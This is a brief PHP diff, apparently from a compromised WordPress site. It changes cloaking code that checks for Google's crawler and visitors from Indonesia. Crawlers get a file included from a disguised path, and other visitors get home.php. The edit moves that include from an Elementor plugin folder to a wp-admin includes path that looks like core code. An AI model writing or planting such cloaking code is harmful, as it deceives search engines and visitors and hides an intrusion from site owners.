@@ -22,7 +22,7 @@ function is_from_indonesia_and_google() {
     return false;
 }
 if (is_google_bot()) {
-include __DIR__ . '/wp-content/plugins/elementor/includes/settings/get.php';
+include __DIR__ . '/wp-admin/includes/get.php';
 } else {
     include('home.php');
     exit;
